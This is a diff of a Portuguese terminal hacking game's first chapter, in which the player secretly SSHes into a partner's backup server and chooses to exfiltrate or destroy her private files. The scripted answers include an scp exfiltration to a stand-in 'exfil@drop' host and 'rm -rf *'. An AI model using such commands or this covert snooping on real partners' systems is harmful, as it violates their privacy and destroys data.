@@ -5,9 +5,8 @@ Brasília, 02:47 AM. O quarto escuro, apenas o brilho azulado do laptop.
 Juliana dorme ao seu lado, alheia. Há semanas de suspeitas. Hoje, a verdade.
 
 Foco: Hacking emocional, invasão de servidor pessoal
-Habilidade: SSH, manipulação de arquivos
-Momento-chave: Descoberta dos arquivos do Hotel Nobile
-Decisão Crítica: Preservar ou destruir as evidências?
+Habilidades: SSH básico, navegação Linux, manipulação de arquivos
+Objetivos: 5 missões principais com pressão de tempo
 """
 
 import os
@@ -21,7 +20,7 @@ from pathlib import Path
 
 # Importar dependências
 try:
-    from utils.terminal_kali import C
+    from utils.terminal_kali import C, digitar as _digitar_padrao
 except ImportError:
     class C:
         VERDE = '\033[92m'
@@ -34,584 +33,441 @@ except ImportError:
         NEGRITO = '\033[1m'
         RESET = '\033[0m'
 
+    def _digitar_padrao(texto, delay=0.01, cor=C.BRANCO, fim="\n"):
+        """Fallback para função de digitação"""
+        for char in texto:
+            print(f"{cor}{char}{C.RESET}", end='', flush=True)
+            time.sleep(delay)
+        print(fim, end='')
+
 
 # ========== GERENCIADOR DE ESTADO DO JOGO ==========
 
 class GameState:
     """Gerencia o estado durante o capítulo"""
-    
+
     def __init__(self, dados_jogador):
-        self.player_name = dados_jogador.get('player_name', 'Neo')
-        self.codinome = dados_jogador.get('codiname', 'SHADOW_00')
-        self.bitcoin_wallet = dados_jogador.get('bitcoin_wallet', 0.005)
-        self.privacy_level = dados_jogador.get('privacy_level', 80)
-        self.reputation = dados_jogador.get('reputation', 0)
+        # Dados originais do jogador
+        self.player_name = dados_jogador.get('player_name', 'Hacker')
+        self.codiname = dados_jogador.get('codiname', 'ANON')
+        self.current_chapter = dados_jogador.get('current_chapter', 1)
+        self.completed_chapters = dados_jogador.get('completed_chapters', [])
         self.score = dados_jogador.get('score', 0)
-        
+        self.privacy_level = dados_jogador.get('privacy_level', 80)
+        self.bitcoin_wallet = dados_jogador.get('bitcoin_wallet', 0.005)
+        self.inventory = dados_jogador.get('inventory', [])
+        self.darknet_access = dados_jogador.get('darknet_access', False)
+        self.reputation = dados_jogador.get('reputation', 0)
+        self.last_seen = dados_jogador.get('last_seen', datetime.now().isoformat())
+
         # Estado do capítulo
-        self.erros = 0
-        self.max_erros = 3
-        self.game_over = False
-        self.capitulo_concluido = False
-        self.decisao_final = None
-        self.operacao_sucesso = False
-        self.saindo_para_menu = False
-        
-        # Checkpoint
+        self.capitulo_concluido = dados_jogador.get('completed', False)
+        self.operacao_sucesso = dados_jogador.get('capitulo_1_operacao_sucesso', False)
         self.checkpoint = dados_jogador.get('chapter_01_checkpoint', 'inicio')
-        
-        # Histórico
-        self.comandos_digitados = []
-        self.historico_mensagens = []
-    
-    def registrar_falha(self, penalidade=5):
-        """Registra uma falha e aplica penalidade"""
-        self.erros += 1
-        self.privacy_level = max(0, self.privacy_level - penalidade)
-        
-        if self.erros >= self.max_erros:
-            self.game_over = True
-    
-    def registrar_sucesso(self, bonus=10):
-        """Registra sucesso e aplica bônus"""
-        self.score += bonus
-        self.privacy_level = min(100, self.privacy_level + (bonus // 2))
-    
-    def to_dict(self):
-        """Converte para dicionário para salvar"""
-        return {
-            'player_name': self.player_name,
-            'codiname': self.codinome,
-            'capitulo_1_resultado': self.decisao_final,
-            'capitulo_1_operacao_sucesso': self.operacao_sucesso,
-            'chapter_01_checkpoint': self.checkpoint,
-            'completed': self.capitulo_concluido,
-            'saindo_para_menu': self.saindo_para_menu
+        self.saindo_para_menu = dados_jogador.get('saindo_para_menu', False)
+        self.capitulo_1_resultado = dados_jogador.get('capitulo_1_resultado', None)
+
+        # Missões do capítulo 1
+        self.missoes = dados_jogador.get('missoes_capitulo_1', {
+            'conexao_ssh': False,           # Conectar via SSH
+            'navegacao_private': False,     # Navegar para pasta Private
+            'listar_arquivos': False,       # Listar arquivos ocultos
+            'exfiltrar_evidencias': False,  # Exfiltrar evidências
+            'cobrir_rastros': False        # Limpar logs/servidor
+        })
+
+        # Missões do capítulo 1
+        self.missoes = {
+            'conexao_ssh': False,           # Conectar via SSH
+            'navegacao_private': False,     # Navegar para pasta Private
+            'listar_arquivos': False,       # Listar arquivos ocultos
+            'exfiltrar_evidencias': False,  # Exfiltrar evidências
+            'cobrir_rastros': False        # Limpar logs/servidor
         }
 
+        # Contadores e flags
+        self.tentativas_ssh = 0
+        self.tempo_decorrido = 0
+        self.risco_descoberta = 0
 
-# ========== EFEITOS VISUAIS ==========
+    def registrar_sucesso(self, pontos=10):
+        """Registra sucesso e adiciona pontos"""
+        self.score += pontos
+        self.privacy_level = max(0, self.privacy_level - 2)  # Pequena perda de privacidade
+
+    def registrar_falha(self, pontos_perdidos=5):
+        """Registra falha e penaliza"""
+        self.score = max(0, self.score - pontos_perdidos)
+        self.privacy_level = max(0, self.privacy_level - 5)
+        self.risco_descoberta += 10
+
+    def completar_missao(self, missao_nome):
+        """Marca missão como completa"""
+        if missao_nome in self.missoes:
+            self.missoes[missao_nome] = True
+            self.registrar_sucesso(15)
+            print(f"\n{C.VERDE}✓ MISSÃO CONCLUÍDA: {missao_nome.replace('_', ' ').upper()}{C.RESET}")
+
+    def verificar_progresso(self):
+        """Verifica progresso das missões"""
+        completas = sum(self.missoes.values())
+        total = len(self.missoes)
+        return completas, total
+
+    def to_dict(self):
+        """Converte estado para dicionário (preserva dados originais)"""
+        dados = {
+            'player_name': self.player_name,
+            'codiname': self.codiname,
+            'current_chapter': self.current_chapter,
+            'completed_chapters': self.completed_chapters,
+            'score': self.score,
+            'privacy_level': self.privacy_level,
+            'bitcoin_wallet': self.bitcoin_wallet,
+            'inventory': self.inventory,
+            'darknet_access': self.darknet_access,
+            'reputation': self.reputation,
+            'last_seen': self.last_seen,
+            'chapter_01_checkpoint': self.checkpoint,
+            'capitulo_1_resultado': self.capitulo_1_resultado,
+            'capitulo_1_operacao_sucesso': self.operacao_sucesso,
+            'completed': self.capitulo_concluido,
+            'saindo_para_menu': self.saindo_para_menu,
+            'missoes_capitulo_1': self.missoes.copy()
+        }
+        return dados
+
+
+# ========== FUNÇÕES AUXILIARES ==========
 
 def limpar_tela():
     """Limpa a tela do terminal"""
-    os.system('cls' if os.name == 'nt' else 'clear')
+    os.system('clear' if os.name != 'nt' else 'cls')
 
-
-def obter_largura_terminal():
-    """Obtém a largura do terminal"""
-    try:
-        return shutil.get_terminal_size().columns
-    except:
-        return 100
-
-
-
-# Usar a função padronizada de digitação do utils
-from utils.terminal_kali import digitar as _digitar_padrao
-
-def digitar(texto, delay=0.01, cor=C.BRANCO, fim="\n"):
-    """Wrapper compatível que encaminha para `utils.terminal_kali.digitar`."""
-    return _digitar_padrao(texto, delay=delay, cor=cor, fim=fim)
-
-
-def sucesso(mensagem):
-    """Mostra mensagem de sucesso"""
-    print(f"{C.VERDE}[✓] {mensagem}{C.RESET}")
-    time.sleep(0.5)
-
+def digitar(texto, delay=0.03, cor=C.BRANCO):
+    """Função de digitação com efeito"""
+    _digitar_padrao(texto, delay, cor)
 
 def erro(mensagem):
-    """Mostra mensagem de erro"""
-    print(f"{C.VERMELHO}[!] {mensagem}{C.RESET}")
-    time.sleep(0.5)
+    """Exibe mensagem de erro"""
+    print(f"\n{C.VERMELHO}[ERRO] {mensagem}{C.RESET}")
 
+def sucesso(mensagem):
+    """Exibe mensagem de sucesso"""
+    print(f"\n{C.VERDE}[SUCESSO] {mensagem}{C.RESET}")
 
 def aviso(mensagem):
-    """Mostra mensagem de aviso"""
-    print(f"{C.AMARELO}[*] {mensagem}{C.RESET}")
-    time.sleep(0.3)
+    """Exibe mensagem de aviso"""
+    print(f"\n{C.AMARELO}[AVISO] {mensagem}{C.RESET}")
 
+def prompt_kali(username="hacker"):
+    """Retorna prompt estilo Kali Linux"""
+    return f"{C.VERDE}{username}{C.CINZA}@{C.AMARELO}kali{C.RESET}{C.CINZA}:{C.AMARELO}~{C.RESET}{C.CINZA}$ {C.RESET}"
 
-def prompt_kali(codinome):
-    """Retorna o prompt do terminal Kali"""
-    return f"{C.VERDE}root@kali{C.RESET}:~{C.VERDE}#{C.RESET} "
-
-
-# ========== CABEÇALHOS E CENAS ==========
-
-def header_kali_v2():
-    """Cabeçalho bonito do Kali Linux"""
+def exibir_header():
+    """Exibe cabeçalho do capítulo"""
     limpar_tela()
-    largura = obter_largura_terminal()
-    
-    print(f"{C.VERDE}{'═' * largura}{C.RESET}")
-    print(f"{C.CIANO}{C.NEGRITO}{'[ROOT EVOLUTION - CAPÍTULO 1: PROTOCOLO TRAIÇÃO]':^{largura}}{C.RESET}")
-    print(f"{C.CINZA}{'Brasília, 02:47 AM | Terminal: Kali Linux 2024':^{largura}}{C.RESET}")
-    print(f"{C.VERDE}{'═' * largura}{C.RESET}")
-    print()
-    print(f"{C.AMARELO}💡 DICA: Digite {C.RESET}{C.VERMELHO}'menu'{C.RESET}{C.AMARELO} para retornar ao menu do jogo a qualquer momento.{C.RESET}")
-    print(f"{C.AMARELO}📖 Acesse{C.RESET}{C.VERMELHO}'manual'{C.RESET}{C.AMARELO}para consultar o Manual de Hacking durante o jogo.{C.RESET}")
-    print(f"{C.VERDE}{'═' * largura}{C.RESET}\n")
+    print(f"\n{C.VERMELHO}{'═' * 80}{C.RESET}")
+    print(f"{C.VERMELHO}║{'ROOT EVOLUTION - CAPÍTULO 1: PROTOCOLO TRAIÇÃO':^78}║{C.RESET}")
+    print(f"{C.CINZA}║{'Brasília, 02:47 AM | Terminal: Kali Linux 2024':^78}║{C.RESET}")
+    print(f"{C.VERMELHO}{'═' * 80}{C.RESET}")
+    print(f"\n{C.CINZA}💡 DICA: Digite 'menu' para retornar ao menu do jogo a qualquer momento.{C.RESET}")
+    print(f"{C.CINZA}📖 Acesse 'manual' para consultar o Manual de Hacking durante o jogo.{C.RESET}")
+    print(f"{C.VERMELHO}{'═' * 80}{C.RESET}")
 
+def exibir_status(state):
+    """Exibe status atual do jogador"""
+    completas, total = state.verificar_progresso()
+    progresso = completas / total * 100
 
-def exibir_proximidade(estagio):
-    """Exibe visualmente o quão perto Juliana está"""
+    print(f"\n{C.AMARELO}┌─ STATUS DO HACKER ──────────────────────────────┐{C.RESET}")
+    print(f"{C.AMARELO}│{C.RESET} Score: {C.VERDE}{state.score:3d}{C.RESET} │ Privacidade: {C.CIANO}{state.privacy_level:2d}%{C.RESET} │ Missões: {C.VERDE}{completas}/{total}{C.RESET} ({C.VERDE}{progresso:3.0f}%{C.RESET}) {C.AMARELO}│{C.RESET}")
+    print(f"{C.AMARELO}└─────────────────────────────────────────────────┘{C.RESET}")
+
+def exibir_proximidade_juliana(estagio):
+    """Exibe visualmente quão perto Juliana está"""
     estagios = [
-        "[ ○○○○○○○○○ ]   Juliana ainda dorme...",
-        "[ ●○○○○○○○○ ]   Juliana está mexendo na cama...",
-        "[ ●●○○○○○○○ ]   Juliana calçou os chinelos...",
-        "[ ●●●○○○○○○ ]   Ela está caminhando pelo corredor...",
-        "[ ●●●●○○○○○ ]   Ela está colocando a mão na maçaneta...",
-        "[ ●●●●●○○○○ ]   A PORTA ESTÁ ABRINDO!",
-        "[ ●●●●●●●●● ]   ELA ESTÁ ATRÁS DE VOCÊ!"
+        "[    ] Dormindo profundamente...",
+        "[█   ] Movimento na cama...",
+        "[██  ] Senta na cama...",
+        "[███ ] Caminhando pelo corredor...",
+        "[████] Colocando a mão na maçaneta...",
+        "[████] A PORTA ESTÁ ABRINDO!"
     ]
-    
+
     idx = min(estagio, len(estagios) - 1)
-    cor = C.VERMELHO if estagio >= 5 else (C.AMARELO if estagio >= 3 else C.CINZA)
-    
-    print(f"\n{cor}{C.NEGRITO}PROXIMIDADE DE JULIANA:{C.RESET}")
-    print(f"{cor}{estagios[idx]}{C.RESET}\n")
+    cor = C.VERMELHO if estagio >= 4 else C.AMARELO if estagio >= 2 else C.CINZA
 
+    print(f"\n{cor}⚠️  PROXIMIDADE DE JULIANA: {estagios[idx]}{C.RESET}")
 
-def mostrar_arquivos_descobertos():
-    """Mostra os arquivos encontrados no servidor"""
-    print(f"\n{C.VERMELHO}─────────────────────────────────────────────────────{C.RESET}")
-    print(f"{C.VERMELHO}.conversa_hotel_nobile.pdf{C.RESET} | {C.VERMELHO}.fotos_reserva_dupla.zip{C.RESET}")
-    print(f"{C.VERMELHO}─────────────────────────────────────────────────────{C.RESET}")
-    print()
-    time.sleep(2)
-    
-    print(f"{C.NEGRITO}{C.VERMELHO}* MALDIÇÃO... O RANGER DA CAMA... JULIANA ACORDOU! *{C.RESET}")
-    time.sleep(1.5)
-    
-    digitar(f"\n{C.BRANCO}Juliana: '...Amor? Ainda acordado? O que você está fazendo?'{C.RESET}", cor=C.BRANCO, delay=0.05)
-    time.sleep(1)
+def salvar_checkpoint(state, arquivo_save, checkpoint_nome):
+    """Salva checkpoint do jogo"""
+    state.checkpoint = checkpoint_nome
+    dados = state.to_dict()
 
+    try:
+        with open(arquivo_save, 'w', encoding='utf-8') as f:
+            json.dump(dados, f, indent=2, ensure_ascii=False)
+        print(f"\n{C.CINZA}[✓] Checkpoint salvo: {checkpoint_nome}{C.RESET}")
+    except Exception as e:
+        erro(f"Erro ao salvar checkpoint: {e}")
 
-# ========== SISTEMA DE PROMPTS ==========
+def carregar_manual():
+    """Carrega o manual de hacking"""
+    try:
+        from manual_hacking import ManualHacking
+        manual = ManualHacking()
+        manual.mostrar_menu()
+        return True
+    except ImportError:
+        erro("Manual de hacking não encontrado")
+        return False
 
-def prompt_until(cmd_expect, pensamento, state, fatigue=5, arquivo_save=None):
-    """Solicita um comando específico até acertar. Digite 'menu' para voltar ao menu salvando."""
-    tentativas = 0
-    max_tentativas = 3
-    
+# ========== FUNÇÕES DE JOGABILIDADE ==========
+
+def prompt_com_tempo(cmd_esperado, descricao, state, limite_tempo=30):
+    """
+    Prompt com limite de tempo e pressão
+    """
+    print(f"\n{C.CINZA}🎯 OBJETIVO: {descricao}{C.RESET}")
+    print(f"{C.VERDE}💻 COMANDO: {cmd_esperado}{C.RESET}")
+
+    tempo_inicio = time.time()
+    estagio_proximidade = 0
+
     while True:
-        print(f"\n{C.CINZA}# DICA: {pensamento}{C.RESET}")
-        
+        tempo_atual = time.time() - tempo_inicio
+
+        # Aumenta proximidade a cada 5 segundos
+        novo_estagio = int(tempo_atual / 5)
+        if novo_estagio > estagio_proximidade:
+            estagio_proximidade = novo_estagio
+            exibir_proximidade_juliana(estagio_proximidade)
+
+        if tempo_atual > limite_tempo:
+            erro("TEMPO ESGOTADO! Juliana acordou!")
+            state.registrar_falha(20)
+            return False
+
         try:
-            cmd = input(prompt_kali(state.codinome)).strip()
+            cmd = input(f"{C.AZUL}> {C.RESET}").strip()
         except KeyboardInterrupt:
-            print(f"\n{C.VERMELHO}[!] CONEXÃO INTERROMPIDA{C.RESET}")
-            state.game_over = True
+            print(f"\n{C.VERMELHO}Execução interrompida.{C.RESET}")
             return False
-        except EOFError:
-            return False
-        
-        # Comando para voltar ao menu
+
         if cmd.lower() == 'menu':
-            print(f"\n{C.AMARELO}[*] Salvando checkpoint e retornando ao menu...{C.RESET}")
-            if arquivo_save:
-                try:
-                    Path("saves").mkdir(exist_ok=True)
-                    with open(arquivo_save, 'w', encoding='utf-8') as f:
-                        json.dump(state.to_dict(), f, indent=2, ensure_ascii=False)
-                    print(f"{C.VERDE}[✓] Progresso salvo!{C.RESET}")
-                except Exception as e:
-                    print(f"{C.VERMELHO}[!] Erro ao salvar: {e}{C.RESET}")
-            time.sleep(0.5)
             state.saindo_para_menu = True
+            print(f"\n{C.AMARELO}Retornando ao menu principal...{C.RESET}")
             return False
-        
-        # Comando para acessar manual
-        if cmd.lower() in ['manual', 'help', '?']:
-            try:
-                from manual_hacking import exibir_banner
-                exibir_banner()
-            except:
-                print(f"{C.CINZA}Manual não disponível{C.RESET}")
-            print(f"\n{C.AMARELO}[*] VOCÊ PERDEU TEMPO CONSULTANDO O MANUAL!{C.RESET}")
-            state.erros += 1
-            if state.game_over:
-                return False
+
+        if cmd.lower() == 'manual':
+            if carregar_manual():
+                aviso("Você perdeu tempo consultando o manual!")
+                state.registrar_falha(5)
+                estagio_proximidade += 1
             continue
-        
-        # Validar comando
-        if cmd == cmd_expect:
+
+        if cmd == cmd_esperado:
             sucesso("Comando executado com sucesso!")
-            state.registrar_sucesso(10)
             return True
         else:
-            tentativas += 1
-            state.registrar_falha(fatigue)
-            state.comandos_digitados.append(cmd)
-            
-            if tentativas >= max_tentativas:
-                erro("Muitas tentativas erradas!")
-                return False
-            
-            erro(f"Comando incorreto. ({tentativas}/{max_tentativas})")
-            print(f"{C.VERMELHO}[!] Ela ouviu o barulho do teclado e se levantou da cama!{C.RESET}")
-            time.sleep(0.3)
+            erro("Comando incorreto. Tente novamente.")
+            state.registrar_falha(3)
+            estagio_proximidade += 1
 
+def tutorial_basico():
+    """Tutorial básico de comandos Linux"""
+    print(f"\n{C.AMARELO}┌─ TUTORIAL BÁSICO DE LINUX ──────────────────────┐{C.RESET}")
+    print(f"{C.AMARELO}│{C.RESET} Comandos essenciais que você aprenderá:        {C.AMARELO}│{C.RESET}")
+    print(f"{C.AMARELO}│{C.RESET}                                               {C.AMARELO}│{C.RESET}")
+    print(f"{C.AMARELO}│{C.RESET} • {C.VERDE}ssh user@host{C.RESET} - Conectar remotamente     {C.AMARELO}│{C.RESET}")
+    print(f"{C.AMARELO}│{C.RESET} • {C.VERDE}ls -la{C.RESET} - Listar arquivos detalhado     {C.AMARELO}│{C.RESET}")
+    print(f"{C.AMARELO}│{C.RESET} • {C.VERDE}cd pasta{C.RESET} - Entrar em diretório        {C.AMARELO}│{C.RESET}")
+    print(f"{C.AMARELO}│{C.RESET} • {C.VERDE}scp arquivo user@host:~/{C.RESET} - Copiar arquivo {C.AMARELO}│{C.RESET}")
+    print(f"{C.AMARELO}│{C.RESET} • {C.VERDE}rm -rf arquivo{C.RESET} - Remover arquivo        {C.AMARELO}│{C.RESET}")
+    print(f"{C.AMARELO}└─────────────────────────────────────────────────┘{C.RESET}")
+    input(f"\n{C.CINZA}[ENTER para continuar]{C.RESET}")
 
-def prompt_sob_pressao(cmd_expect, state, escolha_nome, fase_inicial=0, arquivo_save=None):
-    """Desafio sob pressão temporal. Digite 'menu' para voltar ao menu."""
-    estagio_atual = fase_inicial
-    limite_estagios = 6
-    tentativas = 0
-    
-    print(f"\n{C.NEGRITO}{C.BRANCO}{'═' * 60}{C.RESET}")
-    print(f"{C.NEGRITO}{C.BRANCO}{'ALERTA: ELA ESTÁ VINDO!':^60}{C.RESET}")
-    print(f"{C.NEGRITO}{C.BRANCO}{'═' * 60}{C.RESET}")
-    print(f"{C.CINZA}Tarefa: {escolha_nome}{C.RESET}")
-    print(f"{C.CINZA}(digite 'menu' para retornar ao menu de jogo){C.RESET}")
-    
-    while estagio_atual < limite_estagios:
-        exibir_proximidade(estagio_atual)
-        print(f"{C.VERDE}# COMANDO ALVO: {C.CIANO}{cmd_expect}{C.RESET}")
-        
-        try:
-            cmd = input(f"{C.VERMELHO}>>> {C.RESET}" + prompt_kali(state.codinome)).strip()
-        except (KeyboardInterrupt, EOFError):
-            state.game_over = True
-            return "GAMEOVER"
-        
-        # Comando para voltar ao menu
-        if cmd.lower() == 'menu':
-            print(f"\n{C.AMARELO}[*] Salvando checkpoint e retornando ao menu...{C.RESET}")
-            if arquivo_save:
-                try:
-                    Path("saves").mkdir(exist_ok=True)
-                    with open(arquivo_save, 'w', encoding='utf-8') as f:
-                        json.dump(state.to_dict(), f, indent=2, ensure_ascii=False)
-                    print(f"{C.VERDE}[✓] Progresso salvo!{C.RESET}")
-                except Exception as e:
-                    print(f"{C.VERMELHO}[!] Erro ao salvar: {e}{C.RESET}")
-            time.sleep(0.5)
-            state.saindo_para_menu = True
-            return "MENU"
-        
-        # Manual
-        if cmd.lower() in ['manual', 'help']:
-            try:
-                from manual_hacking import exibir_banner
-                exibir_banner()
-            except:
-                pass
-            print(f"{C.VERMELHO}[!] VOCÊ PERDEU TEMPO COM O MANUAL!{C.RESET}")
-            estagio_atual += 2
-            state.erros += 1
-            continue
-        
-        # Comando correto
-        if cmd == cmd_expect:
-            sucesso("OPERAÇÃO BEM-SUCEDIDA!")
-            state.registrar_sucesso(15)
-            return "SUCESSO"
-        
-        # Comando errado
-        tentativas += 1
-        estagio_atual += 1
-        state.registrar_falha(5)
-        state.comandos_digitados.append(cmd)
-        
-        print(f"{C.VERMELHO}{C.NEGRITO}[!] COMANDO INVÁLIDO! ELA OUVIU!{C.RESET}")
-        time.sleep(0.5)
-    
-    return "TIMEOUT"
+# ========== CAPÍTULO 1: SEQUÊNCIA PRINCIPAL ==========
 
-
-# ========== CENA PRINCIPAL ==========
-
-def iniciar(dados_jogador, arquivo_save):
+def iniciar(dados_jogador, arquivo_save=None):
     """
     Função principal do Capítulo 1
-    
-    Args:
-        dados_jogador: Dicionário com dados do personagem
-        arquivo_save: Caminho do arquivo de save
-    
-    Returns:
-        Dicionário com dados atualizados do jogador
     """
-    
-    # Inicializar estado
     state = GameState(dados_jogador)
-    
-    # ========== ABERTURA ==========
-    
-    header_kali_v2() 
-    
-    print()
-    time.sleep(0.5)
-    
-    digitar(f"{C.CIANO}O café esfriou há horas. O silêncio é quebrado apenas pelo cooler do PC...{C.RESET}", 
-            delay=0.08, cor=C.CIANO)
-    time.sleep(1)
-    
-    digitar(f"{C.CIANO}Juliana dorme ao meu lado. Ela tem andado muito distante ultimamente.{C.RESET}", 
-            delay=0.08, cor=C.CIANO)
-    time.sleep(1)
 
-    digitar(f"{C.CIANO}Eu não deveria fazer isso, mas a minha desconfiança me leva a isso...{C.RESET}", 
-            delay=0.08, cor=C.CIANO)
-    time.sleep(1)
-    
-    print(f"\n{C.CINZA}{'─' * 73}{C.RESET}")
-    time.sleep(0.8)
-    
-    # ========== PARTE 1: INVESTIGAÇÃO ==========
-    
-    aviso("Iniciando sequência de hacking...")
-    print()
-    
-    # SSH ao servidor de backup
-    if not prompt_until(
-        "ssh admin@backup-cloud",
-        "Vou conectar ao servidor remoto usando SSH: ssh admin@backup-cloud",
-        state,
-        arquivo_save=arquivo_save
-    ):
-        if state.saindo_para_menu:
-            return state.to_dict()
-        return state.to_dict()
-    
-    time.sleep(0.5)
-    
-    # Entrar na pasta Private
-    if not prompt_until(
-        "cd Private",
-        "Agora vou mudar de pasta (cd) e entrar em Private: cd Private",
-        state,
-        arquivo_save=arquivo_save
-    ):
-        if state.saindo_para_menu:
-            return state.to_dict()
-        return state.to_dict()
-    
-    time.sleep(0.3)
-    
-    # Listar arquivos ocultos
-    if not prompt_until(
-        "ls -a",
-        "Preciso listar todos os arquivos com ls -a (mostra ocultos que começam com ponto)",
-        state,
-        arquivo_save=arquivo_save
-    ):
-        if state.saindo_para_menu:
-            return state.to_dict()
-        return state.to_dict()
-    
-    time.sleep(1)
-    
-    # ========== DESCOBERTA ==========
-    
-    mostrar_arquivos_descobertos()
-    
-    time.sleep(1.2)
-    
-    digitar(f"{C.VERMELHO}DROGA! Ela está vindo em direção à mesa! RÁPIDO!{C.RESET}", 
-            delay=0.08, cor=C.VERMELHO)
-    
-    time.sleep(1)
-    
-    # ========== DECISÃO SOB PRESSÃO ==========
-    
-    print(f"\n{C.NEGRITO}{C.BRANCO}{'═' * 60}{C.RESET}")
-    print(f"{C.NEGRITO}{C.BRANCO}{'DECISÃO CRÍTICA SOB PRESSÃO':^60}{C.RESET}")
-    print(f"{C.NEGRITO}{C.BRANCO}{'═' * 60}{C.RESET}")
-    
-    print(f"\n{C.AMARELO}[1]{C.RESET} EXFILTRAR (Copiar evidências via SCP)")
-    print(f"{C.AMARELO}[2]{C.RESET} DESTRUIR (Limpar tudo com RM -RF)")
-    print()
-    
-    escolha = ""
-    while escolha not in ["1", "2"]:
-        try:
-            escolha = input(f"{C.VERMELHO}[ESCOLHA 1 ou 2]: {C.RESET}").strip()
-        except (KeyboardInterrupt, EOFError):
-            state.game_over = True
-            return state.to_dict()
-    
-    print()
-    
-    # ========== SEQUÊNCIAS FINAIS ==========
-    
-    if escolha == "1":
-        # ========== FINAL A: EXFILTRAR ==========
-        state.decisao_final = "exfiltrar"
-        
-        print(f"{C.AMARELO}[*] MODO ESCOLHIDO: EXFILTRAÇÃO{C.RESET}\n")
-        time.sleep(0.3)
-        
-        resultado = prompt_sob_pressao(
-            "scp .conversa_hotel_nobile.pdf exfil@drop:~/",
-            state,
-            "Exfiltrando Evidências Críticas",
-            fase_inicial=2,
-            arquivo_save=arquivo_save
-        )
-        
-        if resultado == "MENU":
-            return state.to_dict()
-        
-        if resultado == "SUCESSO":
-            sucesso("Arquivo transferido com sucesso!")
-            time.sleep(0.5)
-            
-            digitar(f"\n{C.CIANO}Você fecha o notebook no exato segundo em que ela toca no seu ombro.{C.RESET}", 
-                    delay=0.05, cor=C.CIANO)
-            time.sleep(0.8)
-            
-            digitar(f"{C.BRANCO}Juliana: 'Vem dormir, amor... você trabalha demais.'{C.RESET}", 
-                    delay=0.05, cor=C.BRANCO)
-            time.sleep(0.8)
-            
-            digitar(f"{C.CIANO}Ela não tem ideia. As provas estão seguras. Agora começa o verdadeiro jogo.{C.RESET}", 
-                    delay=0.05, cor=C.CIANO)
-            time.sleep(1)
-            
-            state.capitulo_concluido = True
-            state.operacao_sucesso = True
-            state.registrar_sucesso(50)
-            
-        elif resultado == "TIMEOUT":
-            print(f"\n{C.VERMELHO}Tarde demais... Você ouve a maçaneta virando lentamente atrás de você.{C.RESET}")
-            time.sleep(1.5)
-            
-            limpar_tela()
-            header_kali_v2()
-            
-            print(f"\n{C.VERMELHO}{C.NEGRITO}{'═' * 60}{C.RESET}")
-            print(f"{C.VERMELHO}{C.NEGRITO}{'   VOCÊ FOI DESCOBERTO':^60}{C.RESET}")
-            print(f"{C.VERMELHO}{C.NEGRITO}{'═' * 60}{C.RESET}")
-            
-            time.sleep(0.5)
-            
-            digitar(f"\n{C.BRANCO}Juliana olha o monitor. Seus olhos ficam vermelhos.{C.RESET}", 
-                    delay=0.05, cor=C.BRANCO)
-            time.sleep(0.8)
-            
-            digitar(f"{C.BRANCO}Juliana: 'Então é isso que você faz enquanto eu durmo? VOCÊ INVADIU MEU COMPUTADOR?'{C.RESET}", 
-                    delay=0.05, cor=C.BRANCO)
-            time.sleep(1)
-            
-            digitar(f"{C.VERMELHO}A relação acabou naquela noite.{C.RESET}", 
-                    delay=0.05, cor=C.VERMELHO)
-            time.sleep(1)
-            
-            state.registrar_falha(100)
-    
-    else:
-        # ========== FINAL B: DESTRUIR ==========
-        state.decisao_final = "destruir"
-        
-        print(f"{C.AMARELO}[*] MODO ESCOLHIDO: DESTRUIÇÃO{C.RESET}\n")
-        time.sleep(0.3)
-        
-        resultado = prompt_sob_pressao(
-            "rm -rf *",
-            state,
-            "Apagando Evidências Permanentemente",
-            fase_inicial=2,
-            arquivo_save=arquivo_save
-        )
-        
-        if resultado == "MENU":
-            return state.to_dict()
-        
-        if resultado == "SUCESSO":
-            sucesso("Sistema de arquivos limpo!")
-            time.sleep(0.5)
-            
-            digitar(f"\n{C.CIANO}Você fecha o notebook no exato segundo em que ela toca no seu ombro.{C.RESET}", 
-                    delay=0.05, cor=C.CIANO)
-            time.sleep(0.8)
-            
-            digitar(f"{C.BRANCO}Juliana: 'Vem dormir, amor... você trabalha demais.'{C.RESET}", 
-                    delay=0.05, cor=C.BRANCO)
-            time.sleep(0.8)
-            
-            digitar(f"{C.CINZA}Ela não suspeita de nada. As evidências se foram. Mas agora você sabe a verdade.{C.RESET}", 
-                    delay=0.05, cor=C.CINZA)
-            time.sleep(1)
-            
-            digitar(f"{C.VERMELHO}E essa verdade nunca sairá de você.{C.RESET}", 
-                    delay=0.05, cor=C.VERMELHO)
-            time.sleep(1)
-            
-            state.capitulo_concluido = True
-            state.operacao_sucesso = True
-            state.registrar_sucesso(50)
-        
-        elif resultado == "TIMEOUT":
-            print(f"\n{C.VERMELHO}Tarde demais... A porta abre atrás de você.{C.RESET}")
-            time.sleep(1.5)
-            
-            limpar_tela()
-            header_kali_v2()
-            
-            print(f"\n{C.VERMELHO}{C.NEGRITO}{'═' * 60}{C.RESET}")
-            print(f"{C.VERMELHO}{C.NEGRITO}{'   CAPTURADO EM FLAGRANTE':^60}{C.RESET}")
-            print(f"{C.VERMELHO}{C.NEGRITO}{'═' * 60}{C.RESET}")
-            
-            time.sleep(0.5)
-            
-            digitar(f"\n{C.BRANCO}Juliana vê o terminal aberto. Seus olhos explodem em lágrimas.{C.RESET}", 
-                    delay=0.05, cor=C.BRANCO)
-            time.sleep(0.8)
-            
-            digitar(f"{C.BRANCO}Juliana: 'Você estava deletando tudo? Meu Deus... por quanto tempo?'{C.RESET}", 
-                    delay=0.05, cor=C.BRANCO)
-            time.sleep(1)
-            
-            digitar(f"{C.VERMELHO}A ira dela é pior que qualquer acusação.{C.RESET}", 
-                    delay=0.05, cor=C.VERMELHO)
-            time.sleep(1)
-            
-            state.registrar_falha(100)
-    
-    # ========== ENCERRAMENTO ==========
-    
-    print()
-    input(f"\n{C.BRANCO}[Pressione ENTER para desconectar...]{C.RESET}")
-    
-    # Atualizar dados do jogador
-    dados_atualizados = state.to_dict()
-    
-    # Salvar progresso
     try:
-        Path("saves").mkdir(exist_ok=True)
-        
-        if arquivo_save:
-            with open(arquivo_save, 'w', encoding='utf-8') as f:
-                json.dump(dados_atualizados, f, indent=2, ensure_ascii=False)
+        # Introdução dramática
+        exibir_header()
+
+        digitar("O café esfriou há horas. O silêncio é quebrado apenas pelo cooler do PC...", delay=0.05, cor=C.CIANO)
+        time.sleep(1.5)
+        digitar("Juliana dorme ao meu lado. Ela tem andado muito distante ultimamente.", delay=0.05, cor=C.CIANO)
